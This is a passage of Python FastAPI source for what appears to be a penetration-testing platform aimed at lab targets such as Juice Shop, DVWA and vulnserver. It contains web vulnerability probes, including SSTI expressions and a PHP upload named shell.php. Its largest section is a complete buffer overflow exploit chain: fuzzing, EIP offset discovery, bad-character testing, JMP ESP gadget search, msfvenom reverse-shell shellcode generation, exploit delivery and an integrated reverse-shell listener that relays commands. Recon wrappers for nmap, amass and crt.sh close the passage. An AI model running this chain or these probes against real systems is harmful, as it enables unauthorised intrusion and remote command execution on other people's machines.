    return {"scan_id":scan_id,"target":req.target,"tool":"xxe","vulnerable":vulnerable,"findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}


@app.post("/api/scan/clickjacking")
async def scan_clickjacking(req: ScanRequest, user=Depends(verify_token)):
    findings = []; vulnerable = False
    url = _web_url(req.target)
    try:
        r = _req_lib.get(url, timeout=15, verify=False, headers=_BROWSER_HEADERS)
    except:
        scan_id = str(uuid.uuid4()); save_scan(scan_id,"clickjacking",req.target,{"output":"unreachable"})
        return {"scan_id":scan_id,"target":req.target,"tool":"clickjacking","vulnerable":False,"findings":[],"total":0,"timestamp":datetime.datetime.utcnow().isoformat()}

    xfo = r.headers.get("X-Frame-Options","").strip()
    csp = r.headers.get("Content-Security-Policy","").strip()
    csp_lower = csp.lower()

    # 1. Missing both protections — fully vulnerable
    if not xfo and "frame-ancestors" not in csp_lower:
        vulnerable = True
        findings.append({"detail":"No X-Frame-Options and no CSP frame-ancestors — page can be embedded in any iframe","severity":"MEDIUM","cvss":"6.1","cve":"N/A","cwe":"CWE-1021","cwe_name":"Clickjacking","owasp":"A05:2021","remediation":"Add: X-Frame-Options: DENY\nOr CSP: frame-ancestors 'none'"})

    # 2. X-Frame-Options present but weak
    elif xfo.upper() == "SAMEORIGIN":
        findings.append({"detail":"X-Frame-Options: SAMEORIGIN — framing allowed from same origin (subdomain attacks possible)","severity":"LOW","cvss":"3.1","cve":"N/A","cwe":"CWE-1021","cwe_name":"Clickjacking","owasp":"A05:2021","remediation":"Upgrade to X-Frame-Options: DENY unless same-origin framing is required."})

    # 3. ALLOW-FROM is obsolete — not supported in modern browsers
    elif xfo.upper().startswith("ALLOW-FROM"):
        vulnerable = True
        findings.append({"detail":f"X-Frame-Options: {xfo} — ALLOW-FROM is obsolete and ignored by Chrome/Firefox/Edge","severity":"MEDIUM","cvss":"5.4","cve":"N/A","cwe":"CWE-1021","cwe_name":"Obsolete Clickjacking Protection","owasp":"A05:2021","remediation":"Replace ALLOW-FROM with CSP frame-ancestors directive which is supported by all modern browsers."})

    # 4. CSP frame-ancestors present — check if it's too permissive
    if "frame-ancestors" in csp_lower:
        if "frame-ancestors *" in csp_lower:
            vulnerable = True
            findings.append({"detail":"CSP frame-ancestors * — wildcard allows any origin to frame this page","severity":"MEDIUM","cvss":"6.1","cve":"N/A","cwe":"CWE-1021","cwe_name":"Permissive CSP","owasp":"A05:2021","remediation":"Change to: Content-Security-Policy: frame-ancestors 'none'"})
        elif "frame-ancestors 'none'" in csp_lower or "frame-ancestors \"none\"" in csp_lower:
            findings.append({"detail":"CSP frame-ancestors 'none' — strong clickjacking protection confirmed","severity":"INFO","cvss":"0.0","cve":"N/A","cwe":"N/A","cwe_name":"Protection Present","owasp":"A05:2021","remediation":"No action needed."})
        elif "frame-ancestors 'self'" in csp_lower:
            findings.append({"detail":"CSP frame-ancestors 'self' — only same-origin framing allowed","severity":"LOW","cvss":"2.1","cve":"N/A","cwe":"CWE-1021","cwe_name":"Clickjacking — Partial","owasp":"A05:2021","remediation":"Consider frame-ancestors 'none' if no legitimate framing use case."})

    # 5. Check if X-Frame-Options: DENY properly set — mark as safe
    if xfo.upper() == "DENY":
        findings.append({"detail":"X-Frame-Options: DENY — strong clickjacking protection confirmed","severity":"INFO","cvss":"0.0","cve":"N/A","cwe":"N/A","cwe_name":"Protection Present","owasp":"A05:2021","remediation":"No action needed."})

    scan_id = str(uuid.uuid4()); save_scan(scan_id,"clickjacking",req.target,{"output":str(findings)})
    return {"scan_id":scan_id,"target":req.target,"tool":"clickjacking","vulnerable":vulnerable,"findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/scan/verbtamper")
async def scan_verbtamper(req: ScanRequest, user=Depends(verify_token)):
    findings = []; vulnerable = False
    try:
        r = _req_lib.options(_web_url(req.target),timeout=15,verify=False,headers=_BROWSER_HEADERS)
        allow = r.headers.get("Allow","")
        dangerous = [m for m in ["PUT","DELETE","TRACE","CONNECT","PATCH"] if m in allow]
        if dangerous:
            vulnerable = True
            findings.append({"detail":f"Dangerous HTTP methods allowed: {', '.join(dangerous)}","severity":"HIGH","cvss":"7.5","cve":"N/A","cwe":"CWE-650","cwe_name":"HTTP Verb Tampering","owasp":"A05:2021","remediation":f"Disable methods: {', '.join(dangerous)} in server config."})
    except: pass
    scan_id = str(uuid.uuid4()); save_scan(scan_id,"verbtamper",req.target,{"output":str(findings)})
    return {"scan_id":scan_id,"target":req.target,"tool":"verbtamper","vulnerable":vulnerable,"findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/scan/pollution")
async def scan_pollution(req: ScanRequest, user=Depends(verify_token)):
    findings = []; vulnerable = False
    try:
        r1 = _req_lib.get(_web_url(req.target)+"?id=1",timeout=15,verify=False,headers=_BROWSER_HEADERS)
        r2 = _req_lib.get(_web_url(req.target)+"?id=1&id=2",timeout=15,verify=False,headers=_BROWSER_HEADERS)
        # Only flag if the response difference is substantial (>100 chars) — not just timestamps/session IDs
        if r1 and r2 and abs(len(r1.text)-len(r2.text)) > 100:
            vulnerable = True
            findings.append({"detail":"HTTP Parameter Pollution: duplicate 'id' parameter produces significantly different response (>100 byte difference)","severity":"MEDIUM","cvss":"5.4","cve":"N/A","cwe":"CWE-235","cwe_name":"Parameter Pollution","owasp":"A03:2021","remediation":"Validate and deduplicate all query parameters server-side. Use the first or last value consistently."})
    except: pass
    scan_id = str(uuid.uuid4()); save_scan(scan_id,"pollution",req.target,{"output":str(findings)})
    return {"scan_id":scan_id,"target":req.target,"tool":"pollution","vulnerable":vulnerable,"findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/scan/idor")
async def scan_idor(req: ScanRequest, user=Depends(verify_token)):
    findings = []; vulnerable = False
    base = req.target.rstrip("/")
    baseline_size = None
    is_spa = _detect_spa(req.target)
    try:
        br = _http_get(base + "/", timeout=6)
        if br and br.status_code == 200: baseline_size = len(br.content)
    except: pass
    # Generic REST API ID paths + Juice Shop specific
    id_paths = [
        "/user/1","/user/2","/account/1","/profile/1",
        "/api/user/1","/admin/user/1",
        "/rest/user/1","/rest/user/2",          # Juice Shop
        "/api/users/1","/api/users",            # Generic REST
        "/api/products","/api/products/1",      # Juice Shop
        "/api/orders","/api/baskets/1",         # Juice Shop
        "/api/challenges",                       # Juice Shop
        "/dvwa/vulnerabilities/idor/",           # DVWA
        "/mutillidae/index.php?page=user-info.php&username=admin",  # Mutillidae
    ]
    for p in id_paths:
        url = base + p
        r = _http_get(url, timeout=8)
        if r and r.status_code == 200 and len(r.text) > 30:
            ct = r.headers.get("Content-Type","").lower()
            # Skip if response matches homepage baseline — SPA false positive
            if baseline_size and len(r.content) == baseline_size: continue
            # Skip HTML responses — real IDOR endpoints return JSON
            if "text/html" in ct: continue
            if is_spa and "text/html" in ct: continue
            # Must be JSON with actual data indicators
            data_indicators = ['"id"','"email"','"username"','"user"','"role"','"password"','"token"']
            if "application/json" in ct and any(k in r.text for k in data_indicators):
                vulnerable = True
                findings.append({"detail":f"IDOR: {p} returns user/object data without authentication (HTTP 200, {len(r.text)} bytes)","severity":"HIGH","cvss":"8.1","cve":"N/A","cwe":"CWE-639","cwe_name":"IDOR / Broken Object Level Authorization","owasp":"A01:2021","remediation":"Implement object-level authorization checks on every endpoint. Verify the requesting user owns the resource."})
                if len(findings) >= 3: break
    scan_id = str(uuid.uuid4()); save_scan(scan_id,"idor",req.target,{"output":str(findings)})
    return {"scan_id":scan_id,"target":req.target,"tool":"idor","vulnerable":vulnerable,"findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/scan/ssti")
async def scan_ssti(req: ScanRequest, user=Depends(verify_token)):
    findings = []; vulnerable = False
    payloads = [("?name={{7*7}}","49"),("?q={{7*7}}","49"),("?search=#{7*7}","49")]
    for param,expected in payloads:
        r = _http_get(req.target+param, timeout=8)
        if r and expected in r.text:
            vulnerable = True
            findings.append({"detail":f"SSTI: Template expression evaluated — {param} returned '{expected}'","severity":"CRITICAL","cvss":"9.8","cve":"N/A","cwe":"CWE-1336","cwe_name":"SSTI","owasp":"A03:2021","remediation":"Never render user input as a template. Use safe output encoding."})
            break
    scan_id = str(uuid.uuid4()); save_scan(scan_id,"ssti",req.target,{"output":str(findings)})
    return {"scan_id":scan_id,"target":req.target,"tool":"ssti","vulnerable":vulnerable,"findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/scan/fileupload")
async def scan_fileupload(req: ScanRequest, user=Depends(verify_token)):
    findings = []; vulnerable = False
    upload_paths = ["/upload","/file-upload","/upload.php","/api/upload","/admin/upload"]
    for p in upload_paths:
        try:
            url = req.target.rstrip("/")+p
            r = _req_lib.post(url,files={"file":("shell.php",b"<?php echo 'test'; ?>","application/x-php")},timeout=8,verify=False)
            if r.status_code in (200,201) and ("success" in r.text.lower() or "upload" in r.text.lower()):
                vulnerable = True
                findings.append({"detail":f"File upload endpoint {p} accepts PHP files","severity":"CRITICAL","cvss":"9.8","cve":"N/A","cwe":"CWE-434","cwe_name":"Unrestricted File Upload","owasp":"A04:2021","remediation":"Whitelist allowed file types. Store uploads outside webroot. Rename files."})
                break
        except: pass
    scan_id = str(uuid.uuid4()); save_scan(scan_id,"fileupload",req.target,{"output":str(findings)})
    return {"scan_id":scan_id,"target":req.target,"tool":"fileupload","vulnerable":vulnerable,"findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/scan/dataexfil")
async def scan_dataexfil(req: ScanRequest, user=Depends(verify_token)):
    findings = []
    r = _http_get(_web_url(req.target), timeout=15)
    if r:
        patterns = [(r"\b\d{16}\b","Credit card number pattern"),
                    (r"\b[A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,}\b","Email address exposed"),
                    (r"\b(?:password|passwd|pwd)\s*[:=]\s*\S+","Password in response"),
                    (r"\b(?:api[_-]?key|apikey|secret|token)\s*[:=]\s*\S+","API key/secret exposed")]
        for pattern, desc in patterns:
            if re.search(pattern, r.text, re.IGNORECASE):
                findings.append({"detail":desc,"severity":"HIGH","cvss":"7.5","cve":"N/A","cwe":"CWE-200","cwe_name":"Data Exposure","owasp":"A02:2021","remediation":"Remove sensitive data from HTTP responses."})
    scan_id = str(uuid.uuid4()); save_scan(scan_id,"dataexfil",req.target,{"output":str(findings)})
    return {"scan_id":scan_id,"target":req.target,"tool":"dataexfil","vulnerable":bool(findings),"findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/scan/racecondition")
async def scan_racecondition(req: ScanRequest, user=Depends(verify_token)):
    findings = []; responses = []
    try:
        import concurrent.futures
        def _fetch(i):
            try:
                r = _req_lib.get(_web_url(req.target),timeout=5,verify=False,headers=_BROWSER_HEADERS)
                return r.status_code
            except: return 0
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
            responses = list(ex.map(_fetch, range(10)))
        codes = [c for c in responses if c != 0]
        unique = set(codes)
        # Only flag if there is a mix of success (2xx) and error (5xx) codes — real race condition indicator
        has_success = any(200<=c<300 for c in codes)
        has_server_error = any(500<=c<600 for c in codes)
        if has_success and has_server_error:
            vulnerable = True
            findings.append({"detail":f"Possible race condition: concurrent requests produce both 2xx and 5xx responses {unique} — server may not handle concurrent access safely","severity":"MEDIUM","cvss":"6.8","cve":"N/A","cwe":"CWE-362","cwe_name":"Race Condition","owasp":"A04:2021","remediation":"Implement proper locking and atomic transactions. Use database-level constraints for shared resources."})
    except: pass
    scan_id = str(uuid.uuid4()); save_scan(scan_id,"racecondition",req.target,{"output":str(findings)})
    return {"scan_id":scan_id,"target":req.target,"tool":"racecondition","vulnerable":bool(findings),"findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}


# ══════════════════════════════════════════════════════════════
#  BUFFER OVERFLOW MODULE
# ══════════════════════════════════════════════════════════════

import socket as _sock, struct as _struct, time as _time

class BOFRequest(BaseModel):
    target:       str
    prefix:       str  = ""
    fuzz_step:    int  = 100
    pattern_size: int  = 500
    eip_value:    str  = ""
    offset:       int  = 0
    bad_chars:    str  = "\\x00"
    jmp_esp:      str  = ""
    binary_path:  str  = "/home/kali/vulnserver"
    lhost:        str  = ""
    lport:        int  = 4444
    payload_type: str  = "linux/x86/shell_reverse_tcp"
    shellcode:    str  = ""


def _bof_parse_target(target: str):
    parts = target.strip().replace("tcp://","").replace("http://","").split(":")
    host = parts[0]
    port = int(parts[1]) if len(parts) > 1 else 9999
    return host, port


def _bof_send(host, port, data: bytes, timeout=5) -> bool:
    try:
        s = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        s.recv(1024)
        s.send(data + b"\r\n")
        try: s.recv(1024)
        except: pass
        s.close()
        return True
    except Exception:
        return False


def _bof_parse_bad_chars(bad_chars: str) -> list:
    hexes = re.findall(r'[0-9a-fA-F]{2}', bad_chars)
    return [int(h,16) for h in hexes] if hexes else [0x00]

async def _bof_restart_server(binary: str, port: int):
    """Kill existing server and restart it in background, wait until ready."""
    subprocess.run(["pkill", "-f", os.path.basename(binary)], capture_output=True)
    await asyncio.sleep(0.4)
    proc = await asyncio.create_subprocess_exec(
        binary,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.STDOUT,
    )
    # Wait until "listening" appears in output
    for _ in range(30):
        await asyncio.sleep(0.1)
        try:
            line = await asyncio.wait_for(proc.stdout.readline(), timeout=0.2)
            if b"listening" in line.lower() or b"port" in line.lower():
                break
        except asyncio.TimeoutError:
            pass
    await asyncio.sleep(0.2)
    return proc


@app.post("/api/bof/fuzz")
async def bof_fuzz(req: BOFRequest, user=Depends(verify_token)):
    host, port = _bof_parse_target(req.target)
    prefix = req.prefix.encode("latin-1") if req.prefix else b""
    step   = max(10, min(req.fuzz_step, 500))
    size   = step
    crash_at = None
    for _ in range(200):
        payload = prefix + b"A" * size
        try:
            s = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
            s.settimeout(4)
            s.connect((host, port))
            s.recv(1024)
            s.send(payload + b"\r\n")
            try: s.recv(1024)
            except: pass
            s.close()
        except Exception:
            crash_at = size
            break
        _time.sleep(0.3)
        size += step
    if crash_at:
        return {"crash_at":crash_at,"recommended_pattern_size":crash_at+400,"message":f"Server crashed at {crash_at} bytes"}
    return {"crash_at":None,"message":"No crash detected — check target is running"}


@app.post("/api/bof/offset")
async def bof_offset(req: BOFRequest, user=Depends(verify_token)):
    host, port = _bof_parse_target(req.target)
    prefix = req.prefix.encode("latin-1") if req.prefix else b""
    size   = req.pattern_size or 500

    # Generate pattern
    result = await run_tool(["msf-pattern_create", "-l", str(size)], timeout=15)
    pattern = result.get("output", "").strip()
    if not pattern:
        return {"error": "msf-pattern_create failed"}

    binary = req.binary_path or "/home/kali/vulnserver"
    eip_value = req.eip_value.strip() if req.eip_value else None
    offset = None
    gdb_out = ""

    # Auto-detect EIP using GDB if binary is local
    if os.path.exists(binary) and not eip_value:
        try:
            # Kill any existing vulnserver on that port
            subprocess.run(["pkill", "-f", os.path.basename(binary)], capture_output=True)
            await asyncio.sleep(0.5)

            # Start vulnserver under GDB
            gdb_proc = await asyncio.create_subprocess_exec(
                "gdb", "-q", "--batch",
                "-ex", "set confirm off",
                "-ex", "set pagination off",
                "-ex", "handle SIGSEGV stop print",
                "-ex", "run",
                "-ex", "info registers eip",
                "-ex", "quit",
                binary,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.STDOUT,
            )

            # Read output line by line until server is ready
            server_ready = False
            for _ in range(30):  # wait up to 3s
                await asyncio.sleep(0.1)
                try:
                    line = await asyncio.wait_for(
                        gdb_proc.stdout.readline(), timeout=0.2)
                    gdb_out += line.decode("utf-8", errors="replace")
                    if b"listening" in line.lower() or b"port" in line.lower():
                        server_ready = True
                        break
                except asyncio.TimeoutError:
                    pass

            await asyncio.sleep(0.5)

            # Send the pattern
            _bof_send(host, port, prefix + pattern.encode("latin-1"))
            await asyncio.sleep(1.5)

            # Read remaining GDB output (registers after crash)
            try:
                remaining, _ = await asyncio.wait_for(
                    gdb_proc.communicate(), timeout=6)
                gdb_out += remaining.decode("utf-8", errors="replace")
            except asyncio.TimeoutError:
                gdb_proc.kill()

            # Parse EIP
            em = re.search(r"eip\s+0x([0-9a-fA-F]+)", gdb_out, re.IGNORECASE)
            if not em:
                # Also try crash address line: "0x41386541 in ?? ()"
                em = re.search(r"^(0x[0-9a-fA-F]+)\s+in\s+\?\?", gdb_out, re.IGNORECASE | re.MULTILINE)
                if em:
                    eip_value = em.group(1).replace("0x","").upper()
                else:
                    eip_value = None
            else:
                eip_value = em.group(1).upper()

        except Exception as ex:
            gdb_out += f"\n[error] {ex}"

    # Find offset if we have EIP
    if eip_value:
        off_result = await run_tool(
            ["msf-pattern_offset", "-l", str(size), "-q", eip_value], timeout=15)
        m = re.search(r"Exact match at offset (\d+)", off_result.get("output", ""))
        if m: offset = int(m.group(1))

    if not eip_value:
        # Last resort: send pattern and wait for user to enter EIP manually
        _bof_send(host, port, prefix + pattern.encode("latin-1"))

    return {
        "pattern_size": size,
        "eip_value": eip_value or "not captured — enter manually",
        "offset": offset,
        "gdb_log": gdb_out[-500:] if gdb_out else "",
        "message": f"✅ Offset = {offset} bytes  |  EIP = {eip_value}" if offset else "Pattern sent — enter EIP value in the field above to get offset"
    }


@app.post("/api/bof/eip_control")
async def bof_eip_control(req: BOFRequest, user=Depends(verify_token)):
    if not req.offset:
        return {"error":"Offset required"}
    host, port = _bof_parse_target(req.target)
    binary = req.binary_path or "/home/kali/vulnserver"
    prefix = req.prefix.encode("latin-1") if req.prefix else b""
    if os.path.exists(binary):
        await _bof_restart_server(binary, port)
    payload  = prefix + b"A"*req.offset + b"BBBB" + b"C"*max(0,500-req.offset-4)
    _bof_send(host, port, payload)
    return {"offset":req.offset,"payload_size":len(payload),"eip_overwrite":"BBBB (0x42424242)","sent":True,"message":f"Sent {len(payload)} bytes — EIP should show 42424242 in debugger"}


@app.post("/api/bof/badchars")
async def bof_badchars(req: BOFRequest, user=Depends(verify_token)):
    if not req.offset:
        return {"error":"Offset required"}
    host, port = _bof_parse_target(req.target)
    binary = req.binary_path or "/home/kali/vulnserver"
    prefix = req.prefix.encode("latin-1") if req.prefix else b""
    if os.path.exists(binary):
        await _bof_restart_server(binary, port)
    known_bad = _bof_parse_bad_chars(req.bad_chars)
    all_bytes = bytearray([b for b in range(1,256) if b not in known_bad])
    payload  = prefix + b"A"*req.offset + b"BBBB" + bytes(all_bytes) + b"C"*100
    sent = _bof_send(host, port, payload)
    excluded = [f"\\x{b:02x}" for b in known_bad]
    return {"sent":sent,"bytes_tested":len(all_bytes),"excluded":excluded,"payload_size":len(payload),"message":f"Sent {len(all_bytes)} bytes — all sequential = only \\x00 is bad"}


def _elf_find_jmp_esp(binary_path: str, bad_bytes: list, load_base: int = 0) -> list:
    """Pure Python: scan ELF binary for JMP ESP (\\xff\\xe4) — instant, no external tools."""
    gadgets = []
    try:
        with open(binary_path, 'rb') as f:
            data = f.read()
        if len(data) < 52 or data[:4] != b'\x7fELF' or data[4] != 1:
            return []  # not 32-bit ELF
        e_phoff     = _struct.unpack_from('<I', data, 28)[0]
        e_phentsize = _struct.unpack_from('<H', data, 42)[0]
        e_phnum     = _struct.unpack_from('<H', data, 44)[0]
        JMP_ESP = b'\xff\xe4'
        for i in range(e_phnum):
            h = e_phoff + i * e_phentsize
            if h + 32 > len(data):
                break
            p_type  = _struct.unpack_from('<I', data, h)[0]
            p_flags = _struct.unpack_from('<I', data, h + 24)[0]
            p_off   = _struct.unpack_from('<I', data, h + 4)[0]
            p_vaddr = _struct.unpack_from('<I', data, h + 8)[0]
            p_fsz   = _struct.unpack_from('<I', data, h + 16)[0]
            if p_type != 1 or not (p_flags & 1):   # PT_LOAD + PF_X only
                continue
            seg = data[p_off:p_off + p_fsz]
            idx = 0
            while True:
                pos = seg.find(JMP_ESP, idx)
                if pos == -1:
                    break
                vaddr  = load_base + p_vaddr + pos
                vbytes = list(_struct.pack('<I', vaddr))
                if not any(b in bad_bytes for b in vbytes):
                    le = "".join(f"\\x{b:02x}" for b in vbytes)
                    gadgets.append({"address": f"0x{vaddr:08x}", "gadget": "jmp esp", "little_endian": le})
                idx = pos + 1
    except Exception:
        pass
    return gadgets


@app.post("/api/bof/jmpesp")
async def bof_jmpesp(req: BOFRequest, user=Depends(verify_token)):
    binary    = req.binary_path or "/home/kali/vulnserver"
    bad_bytes = _bof_parse_bad_chars(req.bad_chars)

    # Check ASLR
    try:
        with open("/proc/sys/kernel/randomize_va_space") as _f:
            _aslr = _f.read().strip()
    except Exception:
        _aslr = "?"

    # Step 1 — scan primary binary (instant ELF scan, no external tools)
    gadgets = _elf_find_jmp_esp(binary, bad_bytes, load_base=0)
    source  = binary

    # Step 2 — fallback: find libc via ldd, get load base, scan libc
    if not gadgets:
        try:
            ldd_r = subprocess.run(["ldd", binary], capture_output=True, text=True, timeout=5)
            m = re.search(r'libc[^\s]*\s+=>\s+(\S+)\s+\(0x([0-9a-fA-F]+)\)', ldd_r.stdout)
            if m:
                lib_path = m.group(1)
                lib_base = int(m.group(2), 16)
                gadgets  = _elf_find_jmp_esp(lib_path, bad_bytes, load_base=lib_base)
                if gadgets:
                    source = lib_path
        except Exception:
            pass

    # Step 3 — scan known 32-bit libc paths without load_base (ASLR must be 0)
    if not gadgets:
        for lib in ["/usr/lib32/libc.so.6", "/lib32/libc.so.6",
                    "/usr/lib/i386-linux-gnu/libc.so.6"]:
            if os.path.exists(lib):
                gadgets = _elf_find_jmp_esp(lib, bad_bytes, load_base=0)
                if gadgets:
                    source = lib
                    break

    if not gadgets:
        return {"gadgets": [], "address": "", "aslr": _aslr, "message":
                "No clean JMP ESP found. Ensure ASLR=0: echo 0 | sudo tee /proc/sys/kernel/randomize_va_space"}

    best = gadgets[0]
    return {
        "gadgets":      gadgets[:10],   # return top 10 clean gadgets
        "recommended":  best,
        "address":      best["address"],
        "little_endian":best["little_endian"],
        "source":       source,
        "aslr":         _aslr,
        "message":      f"Found {len(gadgets)} clean JMP ESP gadget(s) in {os.path.basename(source)} (no bad chars in address). Use: {best['address']} -> {best['little_endian']}"
    }


@app.post("/api/bof/shellcode")
async def bof_shellcode(req: BOFRequest, user=Depends(verify_token)):
    if not req.lhost:
        return {"error":"LHOST required"}
    bad_bytes = "".join([f"\\x{b:02x}" for b in _bof_parse_bad_chars(req.bad_chars)])
    cmd = ["msfvenom","-p",req.payload_type,f"LHOST={req.lhost}",f"LPORT={req.lport}","EXITFUNC=thread","-b",bad_bytes,"-f","python","-v","shellcode"]
    result = await run_tool(cmd, timeout=60)
    out = result.get("output","")
    lines = [l for l in out.splitlines() if "shellcode" in l and ("b\"" in l or "b'" in l)]
    shellcode_py = "\n".join(lines)
    raw = re.findall(r'b"([^"]+)"', shellcode_py)
    raw_bytes = "".join(raw)
    size_m = re.search(r"Payload size:\s*(\d+) bytes", out)
    size = int(size_m.group(1)) if size_m else None
    return {"payload":req.payload_type,"lhost":req.lhost,"lport":req.lport,"bad_chars":bad_bytes,"size":size,"shellcode_python":shellcode_py,"shellcode_bytes":raw_bytes,"message":f"Shellcode generated: {size} bytes"}


@app.post("/api/bof/exploit")
async def bof_exploit(req: BOFRequest, user=Depends(verify_token)):
    if not req.offset: return {"error":"Offset required"}
    if not req.jmp_esp: return {"error":"JMP ESP address required"}
    if not req.shellcode: return {"error":"Shellcode required"}
    host, port = _bof_parse_target(req.target)
    binary = req.binary_path or "/home/kali/vulnserver"
    prefix = req.prefix.encode("latin-1") if req.prefix else b""
    if os.path.exists(binary):
        await _bof_restart_server(binary, port)
    addr_int = int(req.jmp_esp.strip(),16)
    retn = _struct.pack("<I",addr_int)
    hex_bytes = re.findall(r'\\x([0-9a-fA-F]{2})', req.shellcode)
    sc = bytes([int(h,16) for h in hex_bytes])
    if not sc: return {"error":"Could not parse shellcode"}
    payload = prefix + b"A"*req.offset + retn + b"\x90"*16 + sc
    _bof_send(host, port, payload, timeout=6)
    return {"sent":True,"payload_size":len(payload),"offset":req.offset,"retn":req.jmp_esp,"shellcode_size":len(sc),"message":f"✅ Exploit sent!"}


# ── INTEGRATED SHELL LISTENER ────────────────────────────────
class _ShellSession:
    def __init__(self, lid, lport):
        self.lid    = lid
        self.lport  = lport
        self.output = []
        self.status = "waiting"   # waiting | connected | closed
        self.writer = None
        self.server = None

SHELL_SESSIONS: dict = {}

async def _shell_handler(reader, writer, lid, sessions=None):
    store = sessions if sessions is not None else SHELL_SESSIONS
    addr = writer.get_extra_info("peername")
    s = store.get(lid)
    if not s: return
    s.status = "connected"
    s.writer = writer
    s.output.append(f"[+] Shell connected from {addr[0]}:{addr[1]}\n")
    try:
        while True:
            data = await asyncio.wait_for(reader.read(4096), timeout=300)
            if not data: break
            s.output.append(data.decode("utf-8", errors="replace"))
    except Exception:
        pass
    s.status = "closed"
    try: writer.close()
    except: pass

@app.post("/api/bof/shell/start")
async def bof_shell_start(req: BOFRequest, user=Depends(verify_token)):
    lport = req.lport or 4444
    lid   = f"shell_{lport}"
    # Close existing session on same port
    if lid in SHELL_SESSIONS:
        try:
            if SHELL_SESSIONS[lid].server: SHELL_SESSIONS[lid].server.close()
            if SHELL_SESSIONS[lid].writer: SHELL_SESSIONS[lid].writer.close()
        except: pass
    # Kill any existing process holding the port (e.g. leftover nc)
    try:
        subprocess.run(["fuser", "-k", f"{lport}/tcp"], capture_output=True)
    except FileNotFoundError:
        try:
            subprocess.run(["pkill", "-f", f":{lport}"], capture_output=True)
        except Exception:
            pass
    except Exception:
        pass
    await asyncio.sleep(0.5)
    session = _ShellSession(lid, lport)
    SHELL_SESSIONS[lid] = session
    try:
        server = await asyncio.start_server(
            lambda r, w: _shell_handler(r, w, lid), "0.0.0.0", lport,
            reuse_port=True)
        session.server = server
        asyncio.create_task(server.serve_forever())
        return {"lid": lid, "port": lport, "status": "waiting", "ok": True,
                "message": f"Listener ready on port {lport} — send exploit now"}
    except Exception as e:
        return {"error": str(e), "lid": lid, "ok": False}

@app.get("/api/bof/shell/{lid}/output")
async def bof_shell_output(lid: str, user=Depends(verify_token)):
    s = SHELL_SESSIONS.get(lid)
    if not s: return {"output": "", "status": "not_found"}
    out = "".join(s.output); s.output = []
    return {"output": out, "status": s.status}

@app.post("/api/bof/shell/{lid}/cmd")
async def bof_shell_cmd(lid: str, body: dict, user=Depends(verify_token)):
    s = SHELL_SESSIONS.get(lid)
    if not s or not s.writer: return {"error": "No shell connected"}
    try:
        cmd = body.get("cmd", "")
        s.writer.write((cmd + "\n").encode())
        await s.writer.drain()
        return {"sent": True}
    except Exception as e:
        return {"error": str(e)}

@app.post("/api/bof/shell/{lid}/stop")
async def bof_shell_stop(lid: str, user=Depends(verify_token)):
    s = SHELL_SESSIONS.pop(lid, None)
    if s:
        try:
            if s.server: s.server.close()
            if s.writer: s.writer.close()
        except: pass
    return {"stopped": True}

@app.post("/api/recon/dnsrecon")
async def recon_dnsrecon(req: ScanRequest, user=Depends(verify_token)):
    host = _recon_host(req.target)
    result = await run_tool(["dnsrecon", "-d", host, "-t", "std"], timeout=60)
    out = result.get("output","")
    records = []
    for line in out.splitlines():
        m = re.match(r'\[\*\]\s+(A|AAAA|NS|MX|TXT|CNAME|SOA|PTR|SRV)\s+(\S+)\s+(.*)', line.strip())
        if m:
            records.append({"type": m.group(1), "name": m.group(2), "address": m.group(3).strip()})
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "dnsrecon", req.target, result)
    return {"scan_id":scan_id,"target":req.target,"tool":"dnsrecon","records":records,"raw_output":out,"timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/recon/crtsh")
async def recon_crtsh(req: ScanRequest, user=Depends(verify_token)):
    host = _recon_host(req.target)
    subdomains = []
    try:
        async with httpx.AsyncClient(timeout=30) as client:
            r = await client.get(f"https://crt.sh/?q=%.{host}&output=json")
            if r.status_code == 200:
                for entry in r.json():
                    for sub in entry.get("name_value","").split("\n"):
                        sub = sub.strip().lstrip("*.")
                        if sub and sub not in subdomains:
                            subdomains.append(sub)
    except: pass
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "crtsh", req.target, {"output":str(subdomains)})
    return {"scan_id":scan_id,"target":req.target,"tool":"crtsh","subdomains":subdomains,"total":len(subdomains),"timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/recon/amass")
async def recon_amass(req: ScanRequest, user=Depends(verify_token)):
    host = _recon_host(req.target)
    result = await run_tool(["amass", "enum", "-passive", "-d", host, "-timeout", "2"], timeout=150)
    out = result.get("output","")
    subdomains = list(dict.fromkeys([l.strip() for l in out.splitlines() if l.strip() and "." in l]))
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "amass", req.target, result)
    return {"scan_id":scan_id,"target":req.target,"tool":"amass","subdomains":subdomains,"total":len(subdomains),"raw_output":out,"timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/recon/harvester")
async def recon_harvester(req: ScanRequest, user=Depends(verify_token)):
    return await recon_theharvester(req, user)

@app.post("/api/recon/services")
async def recon_services(req: ScanRequest, user=Depends(verify_token)):
    host = _recon_host(req.target)
    result = await run_tool(["nmap", "-sV", "--version-intensity", "5", "--open", "-T4", host], timeout=180)
    out = result.get("output","")
    ports = []
    for line in out.splitlines():
        m = re.match(r"(\d+)/(tcp|udp)\s+open\s+(\S+)\s*(.*)", line.strip())
        if m: ports.append({"port":int(m.group(1)),"proto":m.group(2),"service":m.group(3),"version":m.group(4).strip()})
    scan_id = str(uuid.uuid4())
